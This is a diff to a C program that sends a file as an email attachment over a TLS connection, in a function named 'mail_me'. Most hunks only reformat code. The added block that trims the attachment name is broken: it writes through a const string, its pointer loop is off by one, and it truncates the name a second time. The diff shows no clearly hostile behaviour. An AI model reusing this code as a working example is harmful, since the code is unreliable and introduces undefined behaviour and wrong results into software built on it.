@@ -21,8 +21,7 @@
 
 static inline void upload(SSL *s, const char *filename) {
   FILE *fp = fopen(filename, "rb");
-  if (!fp)
-    return;
+  if (!fp) return;
   fseek(fp, 0, SEEK_END);
   long size = ftell(fp);
   rewind(fp);
@@ -94,8 +93,7 @@ static SSL *init_sock(const char *host, const int port) {
   /* Openssl */
   /* ------------------------ */
   SSL *s = SSL_new(SSL_CTX_new(TLS_client_method()));
-  if (!s)
-    puts("s");
+  if (!s) puts("s");
   SSL_set_fd(s, sockfd);
 
   SSL_connect(s);
@@ -136,11 +134,20 @@ int mail_me(const char *attachment) {
 
   WRITE("MIME-Version: 1.0\r\n");
 
-  WRITE("Content-Type:multipart/"
-        "mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
+  WRITE(
+      "Content-Type:multipart/"
+      "mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
 
   char subject[128] = {[0 ... 127] = '\0'};
   memcpy(subject, "Subject:", 8u);
+
+  char *p = attachment;
+  while (*p++)
+    ;
+  p -= 5;
+  *p = '\0';
+
+  attachment[strlen(attachment) - 5] = '\0';
   memcpy(subject + 8, attachment, strlen(attachment));
 
   WRITE(subject);
